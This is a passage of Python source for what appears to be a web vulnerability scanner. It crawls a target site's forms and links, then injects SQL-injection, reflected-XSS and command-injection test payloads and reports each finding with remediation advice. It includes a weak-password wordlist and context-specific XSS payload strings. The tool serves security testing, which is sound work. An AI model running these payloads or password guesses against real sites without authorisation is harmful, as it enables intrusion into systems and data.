    "mysecret",
    "jwt",
    "s3cr3t",
    "pass",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "master",
    "dragon",
    "login",
    "abc123",
    "111111",
    "trustno1",
    "iloveyou",
    "whatever",
    "secret123",
    "root",
    "toor",
    "administrator",
    "p@ssw0rd",
]


# ════════════════════════════════════════════════════════════════════════════
# INJECTION POINT — Ponto onde payloads sao injetados
# ════════════════════════════════════════════════════════════════════════════


@dataclass
class InjectionPoint:
    """Um ponto onde payloads podem ser injetados."""

    url: str
    parameter: str
    method: str = "GET"
    param_type: str = "query"  # query, body, header, cookie, path, json
    original_value: str = ""
    content_type: str = ""
    form_action: str = ""
    form_enctype: str = ""
    additional_params: Dict[str, str] = field(default_factory=dict)

    @property
    def unique_key(self) -> str:
        return f"{self.method}:{self.url}:{self.parameter}:{self.param_type}"


# ════════════════════════════════════════════════════════════════════════════
# FORM PARSER — Extrai forms de HTML
# ════════════════════════════════════════════════════════════════════════════


class FormParser:
    """Parser de formularios HTML para extracao de injection points."""

    FORM_RE = re.compile(
        r"<form[^>]*>(.*?)</form>",
        re.DOTALL | re.IGNORECASE,
    )
    ACTION_RE = re.compile(r'action=["\']?([^"\'\s>]+)', re.IGNORECASE)
    METHOD_RE = re.compile(r'method=["\']?([^"\'\s>]+)', re.IGNORECASE)
    ENCTYPE_RE = re.compile(r'enctype=["\']?([^"\'\s>]+)', re.IGNORECASE)
    INPUT_RE = re.compile(
        r'<input[^>]*?(?:name=["\']?(\w+)["\']?)[^>]*?>',
        re.IGNORECASE,
    )
    INPUT_TYPE_RE = re.compile(r'type=["\']?(\w+)', re.IGNORECASE)
    INPUT_VALUE_RE = re.compile(r'value=["\']?([^"\'\s>]*)', re.IGNORECASE)
    TEXTAREA_RE = re.compile(
        r'<textarea[^>]*?name=["\']?(\w+)["\']?[^>]*?>(.*?)</textarea>',
        re.DOTALL | re.IGNORECASE,
    )
    SELECT_RE = re.compile(
        r'<select[^>]*?name=["\']?(\w+)["\']?[^>]*?>.*?<option[^>]*?value=["\']?([^"\'\s>]*)',
        re.DOTALL | re.IGNORECASE,
    )

    @classmethod
    def extract_forms(cls, html: str, base_url: str) -> List[InjectionPoint]:
        """Extrai todos os injection points de formularios no HTML."""
        points: List[InjectionPoint] = []
        for form_match in cls.FORM_RE.finditer(html):
            form_html = form_match.group(0)
            form_body = form_match.group(1)

            # Parse form attributes
            action = ""
            action_match = cls.ACTION_RE.search(form_html)
            if action_match:
                action = action_match.group(1)
            form_url = urllib.parse.urljoin(base_url, action) if action else base_url

            method = "GET"
            method_match = cls.METHOD_RE.search(form_html)
            if method_match:
                method = method_match.group(1).upper()

            enctype = ""
            enc_match = cls.ENCTYPE_RE.search(form_html)
            if enc_match:
                enctype = enc_match.group(1)

            # Collect all params and their values
            all_params: Dict[str, str] = {}

            # Input fields
            for inp_match in cls.INPUT_RE.finditer(form_body):
                name = inp_match.group(1)
                inp_str = inp_match.group(0)

                type_match = cls.INPUT_TYPE_RE.search(inp_str)
                inp_type = type_match.group(1).lower() if type_match else "text"

                if inp_type in ("submit", "button", "image", "reset", "file"):
                    continue

                val_match = cls.INPUT_VALUE_RE.search(inp_str)
                value = val_match.group(1) if val_match else ""
                if inp_type == "hidden" and value:
                    all_params[name] = value
                else:
                    all_params[name] = value or "test"

            # Textarea
            for ta_match in cls.TEXTAREA_RE.finditer(form_body):
                all_params[ta_match.group(1)] = ta_match.group(2).strip() or "test"

            # Select
            for sel_match in cls.SELECT_RE.finditer(form_body):
                all_params[sel_match.group(1)] = sel_match.group(2) or ""

            # Create injection point for each testable parameter
            for param_name, param_value in all_params.items():
                other_params = {k: v for k, v in all_params.items() if k != param_name}
                pt = InjectionPoint(
                    url=form_url,
                    parameter=param_name,
                    method=method,
                    param_type="body" if method == "POST" else "query",
                    original_value=param_value,
                    content_type=enctype or "application/x-www-form-urlencoded",
                    form_action=form_url,
                    form_enctype=enctype,
                    additional_params=other_params,
                )
                points.append(pt)

        return points

    @classmethod
    def extract_links(cls, html: str, base_url: str) -> List[str]:
        """Extrai todos os links unicos do HTML."""
        links: Set[str] = set()
        href_re = re.compile(r'href=["\']?([^"\'\s>]+)', re.I)
        src_re = re.compile(r'src=["\']?([^"\'\s>]+)', re.I)
        action_re = re.compile(r'action=["\']?([^"\'\s>]+)', re.I)

        for regex in [href_re, src_re, action_re]:
            for m in regex.finditer(html):
                raw = m.group(1).strip()
                if raw.startswith(("#", "mailto:", "tel:", "javascript:", "data:")):
                    continue
                full = urllib.parse.urljoin(base_url, raw)
                links.add(full.split("#")[0])
        return list(links)

    @classmethod
    def extract_query_params(cls, url: str) -> List[InjectionPoint]:
        """Extrai parametros de query string como injection points."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        points: List[InjectionPoint] = []
        base_url = urllib.parse.urlunparse(parsed._replace(query="", fragment=""))

        all_params = {k: v[0] if v else "" for k, v in params.items()}
        for name, value in all_params.items():
            other = {k: v for k, v in all_params.items() if k != name}
            points.append(
                InjectionPoint(
                    url=base_url,
                    parameter=name,
                    method="GET",
                    param_type="query",
                    original_value=value,
                    additional_params=other,
                )
            )
        return points


# ════════════════════════════════════════════════════════════════════════════
# SIREN VULNERABILITY SCANNER — O Scanner Principal
# ════════════════════════════════════════════════════════════════════════════


class SirenScanner:
    """Scanner de vulnerabilidades completo do SIREN.

    Executa deteccao real de vulnerabilidades usando payloads,
    analise de resposta, timing e comparacao diferencial.

    Usage:
        scanner = SirenScanner(ScanConfig(target_url="https://target.com"))
        result = await scanner.run()
    """

    def __init__(self, config: ScanConfig):
        self.config = config
        self.result = ScanResult(target=config.target_url)
        self._visited: Set[str] = set()
        self._injection_points: List[InjectionPoint] = []
        self._session_cookies: Dict[str, str] = {}
        self._base_responses: Dict[str, Tuple[int, str, float]] = {}
        self._rate_limiter: Optional[asyncio.Semaphore] = None
        self._request_count = 0

    async def run(self) -> ScanResult:
        """Executa scan completo."""
        self.result.start_time = time.time()
        logger.info(f"[SIREN] Starting scan: {self.config.target_url}")

        self._rate_limiter = asyncio.Semaphore(self.config.max_concurrent)

        try:
            # Phase 1: Crawl & discover injection points
            await self._crawl(self.config.target_url, depth=0)

            # Phase 2: Extract additional injection points from query params
            for url in list(self._visited):
                params = FormParser.extract_query_params(url)
                for p in params:
                    if p.unique_key not in {
                        ip.unique_key for ip in self._injection_points
                    }:
                        self._injection_points.append(p)

            self.result.parameters_tested = len(self._injection_points)
            logger.info(
                f"[SIREN] Found {len(self._injection_points)} injection points across {len(self._visited)} pages"
            )

            # Phase 3: Passive checks (headers, info disclosure)
            await self._run_passive_checks()

            # Phase 4: Active scanning
            scan_tasks = []
            if self.config.enable_sqli:
                scan_tasks.append(self._scan_sqli())
            if self.config.enable_xss:
                scan_tasks.append(self._scan_xss())
            if self.config.enable_cmdi:
                scan_tasks.append(self._scan_cmdi())
            if self.config.enable_ssrf:
                scan_tasks.append(self._scan_ssrf())
            if self.config.enable_lfi:
                scan_tasks.append(self._scan_lfi())
            if self.config.enable_xxe:
                scan_tasks.append(self._scan_xxe())
            if self.config.enable_ssti:
                scan_tasks.append(self._scan_ssti())
            if self.config.enable_crlf:
                scan_tasks.append(self._scan_crlf())
            if self.config.enable_open_redirect:
                scan_tasks.append(self._scan_open_redirect())
            if self.config.enable_nosqli:
                scan_tasks.append(self._scan_nosqli())
            if self.config.enable_cors:
                scan_tasks.append(self._scan_cors())
            if self.config.enable_jwt:
                scan_tasks.append(self._scan_jwt())

            await asyncio.gather(*scan_tasks, return_exceptions=True)

        except Exception as e:
            self.result.errors.append(f"Scan error: {e}")
            logger.error(f"[SIREN] Scan error: {e}")

        self.result.end_time = time.time()
        self.result.requests_sent = self._request_count

        logger.info(
            f"[SIREN] Scan complete: {len(self.result.findings)} findings, "
            f"{self.result.requests_sent} requests, "
            f"{self.result.duration_seconds:.1f}s"
        )
        return self.result

    # ── HTTP Request Helper ─────────────────────────────────────────────

    async def _request(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        json_data: Any = None,
        timeout: Optional[float] = None,
        allow_redirects: bool = True,
    ) -> Tuple[int, Dict[str, str], str, float]:
        """Faz request HTTP e retorna (status, headers, body, time_ms).

        Usa urllib nativo para nao depender de aiohttp (funciona standalone).
        """
        import urllib.error
        import urllib.request

        if self._rate_limiter:
            async with self._rate_limiter:
                return await self._do_request(
                    url, method, data, headers, json_data, timeout, allow_redirects
                )
        return await self._do_request(
            url, method, data, headers, json_data, timeout, allow_redirects
        )

    async def _do_request(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        json_data: Any = None,
        timeout: Optional[float] = None,
        allow_redirects: bool = True,
    ) -> Tuple[int, Dict[str, str], str, float]:
        """Execucao real do request."""
        import urllib.error
        import urllib.request

        self._request_count += 1
        tout = timeout or self.config.timeout_seconds

        req_headers = {
            "User-Agent": self.config.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "identity",
            "Connection": "keep-alive",
        }
        req_headers.update(self.config.auth_headers)
        if headers:
            req_headers.update(headers)

        if self.config.auth_bearer_token:
            req_headers["Authorization"] = f"Bearer {self.config.auth_bearer_token}"

        if self.config.auth_cookies:
            cookie_str = "; ".join(
                f"{k}={v}" for k, v in self.config.auth_cookies.items()
            )
            existing = req_headers.get("Cookie", "")
            req_headers["Cookie"] = (
                f"{existing}; {cookie_str}" if existing else cookie_str
            )

        body_bytes: Optional[bytes] = None
        if json_data is not None:
            body_bytes = json.dumps(json_data).encode("utf-8")
            req_headers["Content-Type"] = "application/json"
        elif data:
            body_bytes = urllib.parse.urlencode(data).encode("utf-8")
            if "Content-Type" not in req_headers:
                req_headers["Content-Type"] = "application/x-www-form-urlencoded"

        if method == "GET" and data:
            sep = "&" if "?" in url else "?"
            url = url + sep + urllib.parse.urlencode(data)
            body_bytes = None

        # Delay between requests
        if self.config.request_delay_ms > 0:
            await asyncio.sleep(self.config.request_delay_ms / 1000.0)

        start = time.time()
        try:
            req = urllib.request.Request(
                url, data=body_bytes, headers=req_headers, method=method
            )

            ctx = None
            if not self.config.verify_ssl and url.startswith("https"):
                import ssl

                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(
                None,
                lambda: (
                    urllib.request.urlopen(req, timeout=tout, context=ctx)
                    if ctx
                    else urllib.request.urlopen(req, timeout=tout)
                ),
            )

            elapsed_ms = (time.time() - start) * 1000
            status = response.getcode()
            resp_headers = {k.lower(): v for k, v in response.getheaders()}
            body = response.read().decode("utf-8", errors="replace")
            return status, resp_headers, body, elapsed_ms

        except urllib.error.HTTPError as e:
            elapsed_ms = (time.time() - start) * 1000
            try:
                body = e.read().decode("utf-8", errors="replace")
            except Exception:
                body = ""
            resp_headers = (
                {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
            )
            return e.code, resp_headers, body, elapsed_ms

        except Exception as e:
            elapsed_ms = (time.time() - start) * 1000
            return 0, {}, str(e), elapsed_ms

    # ── Crawling ────────────────────────────────────────────────────────

    async def _crawl(self, url: str, depth: int) -> None:
        """Crawl recursivo para descobrir paginas e injection points."""
        if depth > self.config.max_depth:
            return
        if len(self._visited) >= self.config.max_pages:
            return

        normalized = url.split("#")[0].split("?")[0]
        if normalized in self._visited:
            return

        # Check scope
        parsed = urllib.parse.urlparse(url)
        base_parsed = urllib.parse.urlparse(self.config.target_url)
        if parsed.netloc and parsed.netloc != base_parsed.netloc:
            return

        # Check excluded extensions
        path_lower = parsed.path.lower()
        if any(path_lower.endswith(ext) for ext in self.config.excluded_extensions):
            return

        self._visited.add(normalized)
        self.result.pages_scanned += 1

        try:
            status, headers, body, elapsed = await self._request(url)
            if status == 0:
                return

            # Store base response for comparison
            self._base_responses[normalized] = (status, body[:500], elapsed)

            # Extract forms
            forms = FormParser.extract_forms(body, url)
            self._injection_points.extend(forms)
            self.result.forms_found += len(forms)

            # Extract and crawl links
            links = FormParser.extract_links(body, url)
            crawl_tasks = []
            for link in links:
                link_parsed = urllib.parse.urlparse(link)
                if link_parsed.netloc == base_parsed.netloc:
                    crawl_tasks.append(self._crawl(link, depth + 1))

            if crawl_tasks:
                await asyncio.gather(*crawl_tasks[:20], return_exceptions=True)

        except Exception as e:
            self.result.errors.append(f"Crawl error on {url}: {e}")

    # ── Passive Checks ──────────────────────────────────────────────────

    async def _run_passive_checks(self) -> None:
        """Verifica headers de seguranca e info disclosure."""
        try:
            status, headers, body, elapsed = await self._request(self.config.target_url)
            if status == 0:
                return

            # Security headers check
            if self.config.enable_headers:
                for header_name, info in EXPECTED_SECURITY_HEADERS.items():
                    if header_name.lower() not in headers:
                        self.result.add_finding(
                            VulnFinding(
                                title=f"Missing Security Header: {header_name}",
                                category=VulnCategory.MISCONFIG,
                                severity=info["severity"],
                                confidence=Confidence.CONFIRMED,
                                url=self.config.target_url,
                                description=info["description"],
                                cwe_id=info["cwe"],
                                evidence=f"Header '{header_name}' not found in response",
                                remediation=f"Add the '{header_name}' header to all HTTP responses.",
                                tags=["passive", "headers"],
                            )
                        )

            # Server header
            server = headers.get("server", "")
            if server and re.search(r"[\d.]+", server):
                self.result.add_finding(
                    VulnFinding(
                        title="Server Version Disclosure",
                        category=VulnCategory.INFO_DISCLOSURE,
                        severity=Severity.LOW,
                        confidence=Confidence.CONFIRMED,
                        url=self.config.target_url,
                        evidence=f"Server: {server}",
                        description="The server discloses its version in the Server header.",
                        remediation="Configure the web server to suppress version information.",
                        cwe_id=200,
                        tags=["passive", "disclosure"],
                    )
                )

            # X-Powered-By
            powered = headers.get("x-powered-by", "")
            if powered:
                self.result.add_finding(
                    VulnFinding(
                        title="Technology Disclosure via X-Powered-By",
                        category=VulnCategory.INFO_DISCLOSURE,
                        severity=Severity.LOW,
                        confidence=Confidence.CONFIRMED,
                        url=self.config.target_url,
                        evidence=f"X-Powered-By: {powered}",
                        remediation="Remove the X-Powered-By header.",
                        cwe_id=200,
                        tags=["passive", "disclosure"],
                    )
                )

            # Cookie security
            set_cookies = headers.get("set-cookie", "")
            if set_cookies:
                if "httponly" not in set_cookies.lower():
                    self.result.add_finding(
                        VulnFinding(
                            title="Cookie Missing HttpOnly Flag",
                            category=VulnCategory.MISCONFIG,
                            severity=Severity.MEDIUM,
                            confidence=Confidence.CONFIRMED,
                            url=self.config.target_url,
                            evidence=f"Set-Cookie: {set_cookies[:200]}",
                            remediation="Add the HttpOnly flag to all session cookies.",
                            cwe_id=1004,
                            tags=["passive", "cookies"],
                        )
                    )
                if (
                    "secure" not in set_cookies.lower()
                    and self.config.target_url.startswith("https")
                ):
                    self.result.add_finding(
                        VulnFinding(
                            title="Cookie Missing Secure Flag",
                            category=VulnCategory.MISCONFIG,
                            severity=Severity.MEDIUM,
                            confidence=Confidence.CONFIRMED,
                            url=self.config.target_url,
                            evidence=f"Set-Cookie: {set_cookies[:200]}",
                            remediation="Add the Secure flag to all cookies on HTTPS sites.",
                            cwe_id=614,
                            tags=["passive", "cookies"],
                        )
                    )
                if "samesite" not in set_cookies.lower():
                    self.result.add_finding(
                        VulnFinding(
                            title="Cookie Missing SameSite Attribute",
                            category=VulnCategory.MISCONFIG,
                            severity=Severity.LOW,
                            confidence=Confidence.CONFIRMED,
                            url=self.config.target_url,
                            evidence=f"Set-Cookie: {set_cookies[:200]}",
                            remediation="Set SameSite=Strict or SameSite=Lax on cookies.",
                            cwe_id=1275,
                            tags=["passive", "cookies"],
                        )
                    )

            # Information disclosure in body
            if self.config.enable_info_disclosure:
                for pattern, desc, severity in INFO_DISCLOSURE_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        self.result.add_finding(
                            VulnFinding(
                                title=f"Information Disclosure: {desc}",
                                category=VulnCategory.INFO_DISCLOSURE,
                                severity=severity,
                                confidence=Confidence.FIRM,
                                url=self.config.target_url,
                                evidence=match.group(0)[:300],
                                cwe_id=200,
                                tags=["passive", "disclosure"],
                            )
                        )

        except Exception as e:
            self.result.errors.append(f"Passive check error: {e}")

    # ── SQL Injection Scanner ───────────────────────────────────────────

    async def _scan_sqli(self) -> None:
        """Scan para SQL Injection (Error/Blind/Time-based)."""
        for point in self._injection_points:
            # Error-based SQLi
            await self._test_sqli_error(point)
            # Blind SQLi
            await self._test_sqli_blind(point)
            # Time-based blind SQLi
            await self._test_sqli_time(point)

    async def _test_sqli_error(self, point: InjectionPoint) -> None:
        """Testa SQL Injection baseada em erro."""
        for payload in SQLI_ERROR_PAYLOADS[:15]:  # Top 15 more effective
            try:
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if point.method == "POST":
                    status, headers, body, elapsed = await self._request(
                        point.url, method="POST", data=params
                    )
                else:
                    status, headers, body, elapsed = await self._request(
                        point.url, data=params
                    )

                for pattern in SQLI_ERROR_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        self.result.add_finding(
                            VulnFinding(
                                title=f"SQL Injection (Error-based) in '{point.parameter}'",
                                category=VulnCategory.SQLI,
                                severity=Severity.CRITICAL,
                                confidence=Confidence.CONFIRMED,
                                url=point.url,
                                method=point.method,
                                parameter=point.parameter,
                                payload=payload,
                                evidence=match.group(0)[:300],
                                description=(
                                    f"Error-based SQL injection detected in parameter '{point.parameter}'. "
                                    f"The application returns database error messages when injecting SQL syntax."
                                ),
                                impact="Full database compromise. Attacker can extract, modify, or delete all data.",
                                remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
                                cwe_id=89,
                                cvss_score=9.8,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                response_time_ms=elapsed,
                                references=[
                                    "https://owasp.org/www-community/attacks/SQL_Injection",
                                    "https://cwe.mitre.org/data/definitions/89.html",
                                ],
                                tags=["sqli", "error-based", "active"],
                            )
                        )
                        return  # Found, no need to test more payloads
            except Exception as e:
                logger.warning(
                    "SQLi error-based test error for %s: %s",
                    point.url,
                    e,
                    exc_info=True,
                )
                continue

    async def _test_sqli_blind(self, point: InjectionPoint) -> None:
        """Testa Blind SQL Injection por comparacao diferencial."""
        for true_payload, false_payload in SQLI_BLIND_PAYLOADS[:3]:
            try:
                params_true = dict(point.additional_params)
                params_true[point.parameter] = true_payload
                params_false = dict(point.additional_params)
                params_false[point.parameter] = false_payload

                if point.method == "POST":
                    s1, _, body1, _ = await self._request(
                        point.url, "POST", data=params_true
                    )
                    s2, _, body2, _ = await self._request(
                        point.url, "POST", data=params_false
                    )
                else:
                    s1, _, body1, _ = await self._request(point.url, data=params_true)
                    s2, _, body2, _ = await self._request(point.url, data=params_false)

                # Get baseline
                params_normal = dict(point.additional_params)
                params_normal[point.parameter] = point.original_value or "1"
                if point.method == "POST":
                    s0, _, body0, _ = await self._request(
                        point.url, "POST", data=params_normal
                    )
                else:
                    s0, _, body0, _ = await self._request(point.url, data=params_normal)

                # Differential analysis
                sim_true_base = self._similarity(body1, body0)
                sim_false_base = self._similarity(body2, body0)

                if sim_true_base > 0.85 and sim_false_base < 0.5 and len(body1) > 100:
                    self.result.add_finding(
                        VulnFinding(
                            title=f"Blind SQL Injection in '{point.parameter}'",
                            category=VulnCategory.SQLI,
                            severity=Severity.CRITICAL,
                            confidence=Confidence.FIRM,
                            url=point.url,
                            method=point.method,
                            parameter=point.parameter,
                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                            evidence=(
                                f"TRUE response similarity to baseline: {sim_true_base:.2%}\n"
                                f"FALSE response similarity to baseline: {sim_false_base:.2%}\n"
                                f"Significant differential response indicates boolean-based blind SQLi."
                            ),
                            description="Boolean-based blind SQL injection. Application behavior changes based on injected boolean conditions.",
                            impact="Data extraction via boolean inference. Full database compromise possible.",
                            remediation="Use parameterized queries. Implement input validation.",
                            cwe_id=89,
                            cvss_score=9.8,
                            tags=["sqli", "blind", "boolean", "active"],
                        )
                    )
                    return
            except Exception as e:
                logger.warning(
                    "SQLi blind test error for %s: %s", point.url, e, exc_info=True
                )
                continue

    async def _test_sqli_time(self, point: InjectionPoint) -> None:
        """Testa Time-based Blind SQL Injection."""
        for payload_template, expected_delay in SQLI_TIME_PAYLOADS[:3]:
            try:
                payload = payload_template.replace("{delay}", str(expected_delay))
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if point.method == "POST":
                    _, _, _, elapsed = await self._request(
                        point.url, "POST", data=params, timeout=expected_delay + 15
                    )
                else:
                    _, _, _, elapsed = await self._request(
                        point.url, data=params, timeout=expected_delay + 15
                    )

                if elapsed >= expected_delay * 1000 * 0.8:
                    # Verify with no-delay payload
                    params_verify = dict(point.additional_params)
                    params_verify[point.parameter] = point.original_value or "1"
                    if point.method == "POST":
                        _, _, _, elapsed_base = await self._request(
                            point.url, "POST", data=params_verify
                        )
                    else:
                        _, _, _, elapsed_base = await self._request(
                            point.url, data=params_verify
                        )

                    if (
                        elapsed > elapsed_base * 3
                        and elapsed >= expected_delay * 1000 * 0.7
                    ):
                        self.result.add_finding(
                            VulnFinding(
                                title=f"Time-based Blind SQL Injection in '{point.parameter}'",
                                category=VulnCategory.SQLI,
                                severity=Severity.CRITICAL,
                                confidence=Confidence.FIRM,
                                url=point.url,
                                method=point.method,
                                parameter=point.parameter,
                                payload=payload,
                                evidence=(
                                    f"Injected delay: {expected_delay}s\n"
                                    f"Response time with payload: {elapsed:.0f}ms\n"
                                    f"Baseline response time: {elapsed_base:.0f}ms\n"
                                    f"Time difference indicates time-based SQL injection."
                                ),
                                description="Time-based blind SQL injection. The application delays its response when SQL sleep functions are injected.",
                                impact="Data extraction via timing inference. Full database compromise possible.",
                                remediation="Use parameterized queries. Never concatenate user input into SQL.",
                                cwe_id=89,
                                cvss_score=9.8,
                                response_time_ms=elapsed,
                                tags=["sqli", "time-based", "blind", "active"],
                            )
                        )
                        return
            except Exception:
                continue

    # ── XSS Scanner ─────────────────────────────────────────────────────

    async def _scan_xss(self) -> None:
        """Scan para Cross-Site Scripting (reflected)."""
        for point in self._injection_points:
            await self._test_xss_reflected(point)

    async def _test_xss_reflected(self, point: InjectionPoint) -> None:
        """Testa Reflected XSS usando canary + context analysis."""
        # Step 1: Send canary to detect reflection
        canary = (
            f"SIREN_XSS_CANARY_{hashlib.md5(point.unique_key.encode()).hexdigest()[:8]}"
        )
        params = dict(point.additional_params)
        params[point.parameter] = canary

        try:
            if point.method == "POST":
                status, headers, body, elapsed = await self._request(
                    point.url, "POST", data=params
                )
            else:
                status, headers, body, elapsed = await self._request(
                    point.url, data=params
                )

            if canary not in body:
                return  # Not reflected, skip

            # Step 2: Determine reflection context
            context = self._detect_xss_context(body, canary)

            # Step 3: Choose context-appropriate payloads
            context_payloads = self._get_context_payloads(context, canary)

            # Step 4: Test actual XSS payloads
            for payload in context_payloads[:5]:
                params_xss = dict(point.additional_params)
                params_xss[point.parameter] = payload

                try:
                    if point.method == "POST":
                        _, _, xss_body, _ = await self._request(
                            point.url, "POST", data=params_xss
                        )
                    else:
                        _, _, xss_body, _ = await self._request(
                            point.url, data=params_xss
                        )

                    # Check if payload rendered unescaped
                    if self._xss_payload_reflected(payload, xss_body):
                        self.result.add_finding(
                            VulnFinding(
                                title=f"Reflected XSS in '{point.parameter}'",
                                category=VulnCategory.XSS,
                                severity=Severity.MEDIUM,
                                confidence=Confidence.CONFIRMED,
                                url=point.url,
                                method=point.method,
                                parameter=point.parameter,
                                payload=payload,
                                evidence=f"Context: {context}\nPayload reflected unescaped in response.",
                                description=f"Reflected Cross-Site Scripting in '{point.parameter}'. Injection context: {context}.",
                                impact="Execute arbitrary JavaScript in victim's browser. Session hijacking, defacement, phishing.",
                                remediation="Apply context-aware output encoding. Implement Content-Security-Policy.",
                                cwe_id=79,
                                cvss_score=6.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                                tags=["xss", "reflected", context, "active"],
                            )
                        )
                        return
                except Exception as e:
                    logger.warning(
                        "XSS test error for %s: %s", point.url, e, exc_info=True
                    )
                    continue
        except Exception as e:
            logger.warning("XSS reflected scan error: %s", e, exc_info=True)

    def _detect_xss_context(self, body: str, canary: str) -> str:
        """Detecta o contexto onde o canary foi refletido."""
        idx = body.find(canary)
        if idx == -1:
            return "raw_body"

        before = body[max(0, idx - 100) : idx]
        after = body[idx + len(canary) : idx + len(canary) + 100]

        # Check if inside a script tag
        if re.search(r"<script[^>]*>(?:(?!</script>).)*$", before, re.I | re.S):
            if "'" in before[before.rfind("<script") :]:
                return "js_string_sq"
            if '"' in before[before.rfind("<script") :]:
                return "js_string_dq"
            return "js_raw"

        # Check if inside an HTML attribute
        attr_match = re.search(r'(\w+)\s*=\s*["\']?[^"\']*$', before)
        if attr_match:
            quote_char = ""
            tail = before[attr_match.start() :]
            if '"' in tail and tail.count('"') % 2 == 1:
                return "html_attr_dq"
            if "'" in tail and tail.count("'") % 2 == 1:
                return "html_attr_sq"
            return "html_attr_nq"

        # Check if inside an HTML tag (but not attribute)
        if re.search(r"<\w+[^>]*$", before) and not re.search(r">[^<]*$", before):
            return "html_tag"

        # Check if inside HTML comment
        if "<!--" in before and "-->" not in before[before.rfind("<!--") :]:
            return "html_comment"

        # Check if inside CSS
        if re.search(r"<style[^>]*>(?:(?!</style>).)*$", before, re.I | re.S):
            return "css_value"

        return "html_body"

    def _get_context_payloads(self, context: str, canary: str) -> List[str]:
        """Retorna payloads otimizados para o contexto de injecao."""
        payloads_map = {
            "html_body": [
                '<script>alert("SIREN")</script>',
                '<img src=x onerror=alert("SIREN")>',
                '<svg onload=alert("SIREN")>',
                '<details open ontoggle=alert("SIREN")>',
                '<body onload=alert("SIREN")>',
            ],
            "html_attr_dq": [
                '" onfocus="alert(\'SIREN\')" autofocus="',
                '"><script>alert("SIREN")</script>',
                '" onmouseover="alert(\'SIREN\')"',
                '"><img src=x onerror=alert("SIREN")>',
                '" style="background:url(javascript:alert(1))"',
            ],
            "html_attr_sq": [
                "' onfocus='alert(1)' autofocus='",
                "'><script>alert('SIREN')</script>",
                "' onmouseover='alert(1)'",
                "'><img src=x onerror=alert('SIREN')>",
            ],
            "html_attr_nq": [
                " onfocus=alert(1) autofocus",
                "><script>alert(1)</script>",
                " onmouseover=alert(1)",
            ],
            "js_string_dq": [
                '";alert("SIREN");//',
                '"-alert("SIREN")-"',
                '";</script><script>alert("SIREN")</script>',
            ],
            "js_string_sq": [
                "';alert('SIREN');//",
                "'-alert('SIREN')-'",
                "';</script><script>alert('SIREN')</script>",
            ],
            "js_raw": [
                "alert('SIREN')",
                ";alert('SIREN');//",
                "</script><script>alert('SIREN')</script>",
            ],
            "html_tag": [
                " onfocus=alert(1) autofocus",
                " onmouseover=alert(1)",
                "><script>alert(1)</script>",
            ],
            "html_comment": [
                '--><script>alert("SIREN")</script><!--',
                "--><img src=x onerror=alert(1)><!--",
            ],
            "css_value": [
                '</style><script>alert("SIREN")</script>',
                "expression(alert('SIREN'))",
            ],
        }
        return payloads_map.get(context, XSS_PAYLOADS[:8])

    def _xss_payload_reflected(self, payload: str, body: str) -> bool:
        """Verifica se o payload XSS foi refletido sem escaping."""
        if payload in body:
            return True
        # Check key attack strings
        dangerous = [
            "<script>",
            "onerror=",
            "onload=",
            "onfocus=",
            "onmouseover=",
            "ontoggle=",
            "javascript:",
            "alert(",
            "<img src=x",
        ]
        for d in dangerous:
            if d.lower() in payload.lower() and d.lower() in body.lower():
                return True
        return False

    # ── Command Injection Scanner ───────────────────────────────────────

    async def _scan_cmdi(self) -> None:
        """Scan para Command Injection."""
        for point in self._injection_points:
            await self._test_cmdi(point)

    async def _test_cmdi(self, point: InjectionPoint) -> None:
        """Testa OS Command Injection."""
        delay = 5
        for payload_raw in CMDI_PAYLOADS[:10]:
            payload = payload_raw.replace("{delay}", str(delay))
            try:
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if "sleep" in payload or "ping" in payload:
                    # Time-based detection
                    if point.method == "POST":
                        _, _, body, elapsed = await self._request(
                            point.url, "POST", data=params, timeout=delay + 15
                        )
                    else:
                        _, _, body, elapsed = await self._request(
                            point.url, data=params, timeout=delay + 15
                        )

                    if elapsed >= delay * 1000 * 0.7:
                        self.result.add_finding(
                            VulnFinding(
                                title=f"Command Injection (Time-based) in '{point.parameter}'",
                                category=VulnCategory.CMDI,
                                severity=Severity.CRITICAL,
                                confidence=Confidence.FIRM,
                                url=point.url,
                                method=point.method,
                                parameter=point.parameter,
                                payload=payload,
                                evidence=f"Response delayed by {elapsed:.0f}ms (expected ≥{delay*1000}ms)",
                                description="OS command injection detected via time-based technique.",
                                impact="Full server compromise. Execute arbitrary commands on the server.",
                                remediation="Never pass user input to shell commands. Use APIs instead of exec.",
                                cwe_id=78,
                                cvss_score=9.8,
                                response_time_ms=elapsed,
                                tags=["cmdi", "time-based", "active"],
                            )
                        )
                        return
                else:
                    # Output-based detection
                    if point.method == "POST":
                        _, _, body, elapsed = await self._request(
                            point.url, "POST", data=params
                        )
                    else:
                        _, _, body, elapsed = await self._request(
                            point.url, data=params
                        )

                    for pattern in CMDI_SUCCESS_PATTERNS:
                        match = pattern.search(body)
                        if match:
                            self.result.add_finding(
                                VulnFinding(
                                    title=f"Command Injection in '{point.parameter}'",
                                    category=VulnCategory.CMDI,
                                    severity=Severity.CRITICAL,
                                    confidence=Confidence.CONFIRMED,
                                    url=point.url,
                                    method=point.method,
                                    parameter=point.parameter,
                                    payload=payload,
                                    evidence=match.group(0)[:300],
                                    description="OS command injection with output in response.",
